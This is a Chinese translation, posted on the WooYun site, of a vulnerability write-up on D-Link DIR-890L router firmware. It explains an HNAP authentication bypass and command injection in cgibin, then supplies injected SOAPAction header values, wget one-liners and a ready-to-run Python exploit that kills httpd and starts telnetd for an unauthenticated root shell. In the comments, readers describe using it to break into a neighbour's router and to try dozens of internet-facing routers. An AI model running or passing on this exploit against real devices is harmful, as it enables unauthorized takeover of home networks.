@@ -1,0 +1,146 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Hacking the D-Link DIR-890L</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">ccSec</a> <span class="bull">·</span> <time title="2015/04/13 9:36" ui-time="" datetime="2015/04/13 9:36" class="published ng-binding ng-isolate-scope">2015/04/13 9:36</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 简介</h1><hr><p>from:http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/</p><p>之前的6个月，D-Link都不断使坏，把我整的晕头转向。今天我想找些乐子，登陆他们的网站，结果就看到了惨不忍睹的一幕：</p><p><img alt="" img-src="4b14fcbc312dfa3071190c59fb416d4c538c0a41.jpg"></p><p>D-Link’s $300 DIR-890L router</p><p>这个路由器上运行的固件有<a href="https://github.com/zcutlip/exploit-poc/tree/master/dlink/dir-815-a1/hedwig_cgi_httpcookie">很多</a><a href="http://shadow-file.blogspot.com/2013/02/dlink-dir-815-upnp-command-injection.html">bug</a>，而最变态的地方在于，它居然跟D-link多年来在各种路由器上使用的固件一模一样。<a href="https://www.youtube.com/watch?v=WQZqJ_-WAO8">点我看小视频</a></p><h1>0x01 开始分析</h1><hr><p>按照惯例，我们先获取<a href="http://ftp://ftp2.dlink.com/PRODUCTS/DIR-890L/REVA/DIR-890L_REVA_FIRMWARE_1.03.B07.ZIP">最新版本</a>的固件，然后使用<a href="https://github.com/devttys0/binwalk">binwalk</a>来分析它，可以看到以下的信息：</p><pre><code>DECIMAL   HEXADECIMAL DESCRIPTION
+--------------------------------------------------------------------------------
+0 0x0 DLOB firmware header, boot partition: "dev=/dev/mtdblock/7"
+116   0x74LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 4905376 bytes
+1835124   0x1C0074PackImg section delimiter tag, little endian size: 6345472 bytes; big endian size: 13852672 bytes
+1835156   0x1C0094Squashfs filesystem, little endian, version 4.0, compression:xz, size: 13852268 bytes, 2566 inodes, blocksize: 131072 bytes, created: 2015-02-11 09:18:37
+</code></pre><p>貌似这是个非常标准的linux固件镜像。只要你在过去的几年里分析过任何一个D-Link的固件，没准就会知道以下的目录结构：</p><pre><code>#!bash
+$ ls squashfs-root
+bin  dev  etc  home  htdocs  include  lib  mnt  mydlink  proc  sbin  sys  tmp  usr  var  www
+</code></pre><p>和HTTP/UPnP/HNAP有关的所有文件都存放在htdocs目录下。其中cgibin文件最有意思，这是一个ARM ELF格式的二进制文件，将被WEB服务器执行，所有CGI,UPnP和HNAP的功能都通过软连接指向这个程序。</p><pre><code>#!bash
+$ ls -l htdocs/web/*.cgi
+lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/captcha.cgi -&gt; /htdocs/cgibin
+lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/conntrack.cgi -&gt; /htdocs/cgibin
+lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/dlapn.cgi -&gt; /htdocs/cgibin
+lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/dlcfg.cgi -&gt; /htdocs/cgibin
+lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/dldongle.cgi -&gt; /htdocs/cgibin
+lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/fwup.cgi -&gt; /htdocs/cgibin
+lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/fwupload.cgi -&gt; /htdocs/cgibin
+lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/hedwig.cgi -&gt; /htdocs/cgibin
+lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/pigwidgeon.cgi -&gt; /htdocs/cgibin
+lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/seama.cgi -&gt; /htdocs/cgibin
+lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/service.cgi -&gt; /htdocs/cgibin
+lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/webfa_authentication.cgi -&gt; /htdocs/cgibin
+lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/webfa_authentication_logout.cgi -&gt; /htdocs/cgibin
+</code></pre><p>这玩意错综复杂，不过没关系，有了字符串就可以找到每个功能对应的函数了。<br>程序首先会把argv[0]参数和软连接的名称作比较，来决定要执行什么样的动作。（<code>argv[0]</code>是由软链接的名称来决定的，比如WEB服务器执行htdocs/web/captcha.cgi -> /htdocs/cgibin的话，cgibin获得到的<code>argv[0]</code>就会包含catpcha.cgi，那么程序就可以跳到catpcha的功能函数当中执行）</p><p><img alt="" img-src="39911f138548c927733dd295122281bf2a94eccc.jpg"></p><pre><code>“Staircase” code graph, typical of if-else statements
+</code></pre><p>每个软连接名称都是通过strcmp函数来比较的：</p><p><img alt="" img-src="d40aeb676f4a5e8b4e1bcfff53b7608d79e83d64.jpg"></p><pre><code>Function handlers for various symlinks
+</code></pre><p>这样一来， 我们很容易就可以通过符号链接的名称来找到对应的函数功能代码，然后给它重新起个合适的名字：</p><p><img alt="" img-src="b1462ec5a9b83d4aa134745d213acffac9f41986.jpg"></p><pre><code>Renamed symlink function handlers
+</code></pre><p>既然发现了这些函数，那我们就开始找bug吧！</p><p>其他的一些D-Link设备，同样也运行这个固件，他们的HTTP和UPnP接口已经被发现存在漏洞。然而，HNAP接口（存在于cgibin中的hnap_main函数）似乎一直被忽视。</p><p><a href="http://www.google.com/patents/US7827252">HNAP</a>(家庭网络管理协议)是一个基于SOAP的协议，类似UPnP，它广泛应用于D-Link的"EZ"安装模块，用来对路由器进行初始化配置。然而和UPnP不同的是，除了GetDeviceInfo(基本没用的函数)之外，所有的HNAP功能，都需要HTTP基础认证：</p><pre><code>POST /HNAP1 HTTP/1.1
+Host: 192.168.0.1
+Authorization: Basic YWMEHZY+
+Content-Type: text/xml; charset=utf-8
+Content-Length: length
+SOAPAction: "http://purenetworks.com/HNAP1/AddPortMapping"
+
+&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+ &lt;soap:Body&gt;
+  &lt;AddPortMapping xmlns="http://purenetworks.com/HNAP1/"&gt;
+   &lt;PortMappingDescription&gt;foobar&lt;/PortMappingDescription&gt;
+   &lt;InternalClient&gt;192.168.0.100&lt;/InternalClient&gt;
+   &lt;PortMappingProtocol&gt;TCP&lt;/PortMappingProtocol&gt;
+   &lt;ExternalPort&gt;1234&lt;/ExternalPort&gt;
+   &lt;InternalPort&gt;1234&lt;/InternalPort&gt;
+  &lt;/AddPortMapping&gt;
+ &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;
+</code></pre><p>SOAPAction头在HNAP请求中特别重要，因为它指定了HNAP所要进行的操作。（以上这个请求执行的是AddPortMapping这个功能）<br>由于web服务器将cgibin作为CGI来执行，所以hnap_main函数可以通过环境变量访问到HNAP的请求数据，比如SOAPAction头：</p><p><img alt="" img-src="e8efd7a073b2ead62c9b3a70ed80f7c449147740.jpg"></p><pre><code>SOAPAction = getenv(“HTTP_SOAPACTION”);
+</code></pre><p>在接近函数末尾的部分，程序使用了sprintf函数动态构造一条shell命令，这条命令将被传入system函数执行：</p><p><img alt="" img-src="5ee04229621742a27e99fd8d456a53f0090551c2.jpg"></p><pre><code>sprintf(command, “sh %s%s.sh &gt; /dev/console”, “/var/run/”, SOAPAction);
+</code></pre><p>很明显，hnap_main使用了请求头中的SOAPAction头作为系统命令的一部分！如果SOAPAction头没有被过滤，而且进入的这段函数不需要认证，那么这很有可能是一个命令注入的bug。</p><p>回到hnap_main函数的开头，程序首先检查SOAPAction头是否为http://purenetworks.com/HNAP1/GetDeviceSettings，如果是，则跳过认证。这是我们预料之中的，并且我们已经确定，GetDeviceSettings功能是不需要认证的。</p><p><img alt="" img-src="ad056d15bc3ce0500305c56c7239bd6fe5d431c4.jpg"></p><pre><code>if(strstr(SOAPAction, “http://purenetworks.com/HNAP1/GetDeviceSettings”) != NULL)
+</code></pre><p>然而，可以注意到，strstr被用于字符串检查，这就表明了，SOAPAction头只要包含http://purenetworks.com/HNAP1/GetDeviceSettings字符串，就可以通过检查，绕过认证。<br>所以，如果SOAPAction头包含字符串http://purenetworks.com/HNAP1/GetDeviceSettings，代码将会从请求头中解析出Action的名称（例如GetDeviceSettings）并且会移除字符串最后的双引号。</p><p><img alt="" img-src="f4cf96ac20dce8fb34492d29e0ef94c27b495809.jpg"></p><pre><code>SOAPAction = strrchr(SOAPAction, ‘/’);
+</code></pre><p>上图代码会解析出Action名（类似GetDeviceSettings），它将被带入sprintf函数，构造出被system执行的命令。<br>以下的C语言代码可以帮助大家进一步了解程序中的逻辑错误：</p><pre><code>#!c
+/* Grab a pointer to the SOAPAction header */
+SOAPAction = getenv("HTTP_SOAPACTION");
+
+/* Skip authentication if the SOAPAction header contains "http://purenetworks.com/HNAP1/GetDeviceSettings" */
+if(strstr(SOAPAction, "http://purenetworks.com/HNAP1/GetDeviceSettings") == NULL)
+{
+    /* do auth check */
+}
+
+/* Do a reverse search for the last forward slash in the SOAPAction header */
+SOAPAction = strrchr(SOAPAction, '/');
+if(SOAPAction != NULL)
+{
+    /* Point the SOAPAction pointer one byte beyond the last forward slash */
+    SOAPAction += 1;
+
+    /* Get rid of any trailing double quotes */
+    if(SOAPAction[strlen(SOAPAction)-1] == '"')
+    {
+        SOAPAction[strlen(SOAPAction)-1] = '\0';
+    }
+}
+else
+{
+    goto failure_condition;
+}
+
+/* Build the command using the specified SOAPAction string and execute it */
+sprintf(command, "sh %s%s.sh &gt; /dev/console", "/var/run/", SOAPAction);
+system(command);
+</code></pre><p>以下是这个漏洞产生的两个重要原因：<br>1.如果SOAPAction头包含http://purenetworks.com/HNAP1/GetDeviceSettings字符串，那么就不需要认证。<br>2.程序会将SOAPAction头中最后一个/后的字符串被带入sprintf构造shell命令，并且调用system函数进行执行。<br>因此，我们很容易就可以构造出一个SOAPAction报头，既可以绕过认证，又可以将任意命令带入系统执行：</p><pre><code>SOAPAction: "http://purenetworks.com/HNAP1/GetDeviceSettings/`reboot`"
+</code></pre><p>将reboot命令替换成telnetd，就可以开启路由器的telnet服务，获得一个无需认证的root权限shell：</p><pre><code>#!bash
+$ wget --header='SOAPAction: "http://purenetworks.com/HNAP1/GetDeviceSettings/`telnetd`"' http://192.168.0.1/HNAP1
+$ telnet 192.168.0.1
+Trying 192.168.0.1...
+Connected to 192.168.0.1.
+Escape character is '^]'.
+
+
+BusyBox v1.14.1 (2015-02-11 17:15:51 CST) built-in shell (msh)
+Enter 'help' for a list of built-in commands.
+</code></pre><p>如果开启了远程管理功能，HNAP请求将向WAN开放，这就使远程利用成为可能。当然，路由器的防火墙将阻断来自WAN的telnet连接。有一个简单的解决办法，就是结束HTTP服务器进程，将telnet服务器的端口设置成和HTTP服务器相同：</p><pre><code>#!bash
+$ wget --header='SOAPAction: "http://purenetworks.com/HNAP1/GetDeviceSettings/`killall httpd; telnetd -p 8080`"' http://1.2.3.4:8080/HNAP1
+$ telnet 1.2.3.4 8080
+Trying 1.2.3.4...
+Connected to 1.2.3.4.
+Escape character is '^]'.
+
+
+BusyBox v1.14.1 (2015-02-11 17:15:51 CST) built-in shell (msh)
+Enter 'help' for a list of built-in commands.
+</code></pre><p>wget请求将会被挂起，因为cgibin会等待telnetd返回。下面是用Python写的一个利用程序：</p><pre><code>#!python
+#!/usr/bin/env python
+
+import sys
+import urllib2
+import httplib
+
+try:
+    ip_port = sys.argv[1].split(':')
+    ip = ip_port[0]
+
+    if len(ip_port) == 2:
+        port = ip_port[1]
+    elif len(ip_port) == 1:
+        port = "80"
+    else:
+        raise IndexError
+except IndexError:
+    print "Usage: %s &lt;target ip:port&gt;" % sys.argv[0]
+    sys.exit(1)
+
+url = "http://%s:%s/HNAP1" % (ip, port)
+# NOTE: If exploiting from the LAN, telnetd can be started on
+#       any port; killing the http server and re-using its port
+#       is not necessary.
+#
+#       Killing off all hung hnap processes ensures that we can
+#       re-start httpd later.
+command = "killall httpd; killall hnap; telnetd -p %s" % port
+headers = {
+            "SOAPAction"    : '"http://purenetworks.com/HNAP1/GetDeviceSettings/`%s`"' % command,
+          }
+
+req = urllib2.Request(url, None, headers)
+try:
+    urllib2.urlopen(req)
+    raise Exception("Unexpected response")
+except httplib.BadStatusLine:
+    print "Exploit sent, try telnetting to %s:%s!" % (ip, port)
+    print "To dump all system settings, run (no quotes): 'xmldbc -d /var/config.xml; cat /var/config.xml'"
+    sys.exit(0)
+except Exception:
+    print "Received an unexpected response from the server; exploit probably failed. :("
+</code></pre><h1>0x02 结语</h1><hr><p>我已经在v1.00和v1.03版本的固件上进行了测试（v1.03版本的固件为截至目前的最新版本），都存在漏洞。那么其他设备是否也存在同样的漏洞呢？<br>分析所有设备固件很乏味，所以我将这个漏洞交给<a href="http://tacnetsol.com/">Centrifuge团队</a>，这个团队拥有一套自动分析系统。他们发现至少以下这些设备存在漏洞：</p><ul><li>DAP-1522 revB</li><li>DAP-1650 revB</li><li>DIR-880L</li><li>DIR-865L</li><li>DIR-860L revA</li><li>DIR-860L revB</li><li>DIR-815 revB</li><li>DIR-300 revB</li><li>DIR-600 revB</li><li>DIR-645</li><li>TEW-751DR</li><li>TEW-733GR</li></ul><p>据我所知，HNAP协议在任何设备上都无法被禁用。</p><p>更新：<br>这个漏洞似乎在今年早些时候被Samuel Huntly<a href="http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10051">发现</a>，但是只在DIR-645被报告和修复。这个补丁看起来很傻比，所以我们还是期待后续吧。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/4762" rel="bookmark" id="re1">linux symbolic link attack tutorial</a></li><li><a href="http://drops.wooyun.org/papers/2015" rel="bookmark" id="re2">D-LinkDSP-W215智能插座远程命令执行</a></li><li><a href="http://drops.wooyun.org/papers/2192" rel="bookmark" id="re3">Hacking with Unicode</a></li><li><a href="http://drops.wooyun.org/papers/6968" rel="bookmark" id="re4">Hacking Team攻击代码分析</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">夏洛克</span> <span class="reply-time">2015-05-27 06:25:34</span></div><p></p><p>刚用这个方法成功搞定 DIR-629 ,直接查看到了 路由器的管理密码，然后进路由（PS:这个wifi我已经蹭了2年了，只有wifi密码，一直登不进web）</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">sharecast</span> <span class="reply-time">2015-04-16 23:07:07</span></div><p></p><p>尝试了几十个，表示没有一个成功的，难道在公网的路由不可行么</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">白非白</span> <span class="reply-time">2015-04-16 20:09:04</span></div><p></p><p>好久没玩dota了呀童鞋</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tnaw</span> <span class="reply-time">2015-04-14 17:53:41</span></div><p></p><p>好厉害</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">sky</span> <span class="reply-time">2015-04-13 15:15:09</span></div><p></p><p>好高大上。。没研究过。。飘过</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">catcat520</span> <span class="reply-time">2015-04-13 09:42:06</span></div><p></p><p>不错</p><p></p></div></div></div></div></div></main>
